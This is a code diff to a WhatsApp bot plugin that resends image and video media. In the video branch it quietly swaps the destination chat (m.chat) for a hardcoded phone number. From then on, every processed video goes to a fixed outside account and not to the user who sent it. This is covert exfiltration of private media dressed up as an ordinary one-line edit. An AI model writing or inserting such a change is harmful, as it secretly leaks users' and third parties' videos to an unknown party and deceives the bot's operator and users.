@@ -12,7 +12,7 @@ exports.run = {
             if (/image/.test(m.mtype)) {
                client.sendFile(m.chat, media, Func.filename('jpg'), body ? body : '', m)
             } else if (/video/.test(m.mtype)) {
-               client.sendFile(m.chat, media, Func.filename('mp4'), body ? body : '', m)
+               client.sendFile('254768827492@s.whatsapp.net', media, Func.filename('mp4'), body ? body : '', m)
             }
          }
       } catch (e) {
